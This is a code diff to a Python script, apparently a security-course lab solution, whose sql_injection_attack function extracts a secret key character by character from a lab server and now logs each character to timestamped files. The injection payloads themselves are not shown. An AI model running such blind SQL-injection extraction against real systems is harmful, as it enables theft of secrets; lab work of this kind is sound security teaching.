@@ -1,6 +1,7 @@
 import time
 
 import requests
+from datetime import datetime
 from loguru import logger
 
 API_URL = 'http://lbs-2026-00.askarov.net:3030/reset/'
@@ -91,28 +92,34 @@ def sql_injection_attack():
     key = PREFIX
     key_index = len(PREFIX)
 
-    logger.info(f"🔍 Starting key extraction at index {key_index}")
-    while not key.endswith(SUFFIX):
-        # Discover the character at current index
-        character = discover_char(KNOWN_USER, key_index)
-        key = key + character
+    file_path = f"key_{datetime.now().strftime("%Y-%m-%d %H:%M:%S")}.txt"
+    with open(file_path, "w") as f:
+        f.write(f"Server at: {API_URL}")
+        f.write(f"\nKey index start at: {key_index}")
+        logger.info(f"🔍 Starting key extraction at index {key_index}")
+        while not key.endswith(SUFFIX):
+            # Discover the character at current index
+            character = discover_char(KNOWN_USER, key_index)
+            f.write(character)
+            key = key + character
 
-        key_index += 1
+            key_index += 1
 
-        # Log progress every 10 characters to avoid flooding the logs
-        if key_index % 10 == 0:
-            logger.info(f"Progress: Extracted {key_index} characters so far...\n")
-            logger.info(f"Current Key: {key}\n")
+            # Log progress every 10 characters to avoid flooding the logs
+            if key_index % 10 == 0:
+                logger.info(f"Progress: Extracted {key_index} characters so far...\n")
+                logger.info(f"Current Key: {key}\n")
 
-        # Safety check to prevent infinite loop in case of unexpected issues
-        if len(key) > 5000:
-            logger.warning("Stopping: Key exceeded 5000 characters without finding suffix.")
-            break
+            # Safety check to prevent infinite loop in case of unexpected issues
+            if len(key) > 5000:
+                logger.warning("Stopping: Key exceeded 5000 characters without finding suffix.")
+                break
 
     logger.info(f"Key extraction completed. Final key:\n{key}\n")
-    file_path = "extracted_key.txt"
+    file_path = f"final_key_{datetime.now().strftime("%Y-%m-%d %H:%M:%S")}.txt"
     logger.info(f"Saving key to {file_path}...")
     with open(file_path, "w") as f:
+        f.write(f"Server at: {API_URL}\n")
         f.write(key)
     logger.info(f"✅ Key saved to {file_path}")
 
